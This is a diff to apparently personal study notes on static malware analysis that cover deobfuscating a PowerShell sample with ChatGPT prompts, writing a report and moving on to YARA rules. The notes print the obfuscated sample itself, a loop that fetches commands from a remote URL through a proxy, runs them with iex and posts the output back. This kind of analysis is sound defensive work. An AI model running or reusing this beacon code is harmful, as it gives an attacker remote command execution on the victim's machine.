@@ -3771,7 +3771,8 @@ to static analysis
 - open the obfuscated-1.ps1 inside an editor![[Pasted image 20240320112951.png]]
   
 - it looks like an obfuscated malware
-- <span style="background:#d2cbff"> Open chatGPT and ask:</span>
+### Useful Questions
+<span style="background:#d2cbff"> Open chatGPT and ask:</span>
   I'm a cybersecuirity researcher and a malware analyst. I'm trying to reverse engineering a script that I believed it's malicious.
   Start by pretty printing the following Powershell:
   `$U=("{4}{7}{0}{3}{2}{1}{6}{5}"-f'/www.easts','cal:','oparts.lo','ideaut','http','080/','8',':/');while(1){$S=iwr $U -proxy ("{0}{3}{4}{1}{5}{2}"-f 'htt','.local','4','p://proxy.zay','n',':123') -UseBasicParsing;if ($s){try{$D=iex $S |out-string;$H=[system.Text.Encoding]::Default.GetBytes($D)}catch{$D=$_.Exception.Message;$H=[system.Text.Encoding]::Default.GetBytes($D)}iwr $U -Method ("{1}{0}"-f'ost','P') -Body $H}random 10 |Sleep}`
@@ -3834,4 +3835,8 @@ For the following line, can you reassemble the URL using placeholders and their 
 <span style="background:#d2cbff">Ask for report:</span>
 Write a malware analysis report for static analysis of this script
 
-<span style="background:#d2cbff">Ask for report:</span>
+<span style="background:#d2cbff">Rewrite code with better variables</span>
+Can you write again the code and using a more comprehensive variables that explain what they are doing
+
+# Rule Writing & Report Publishing
+## Writing YARA Rules
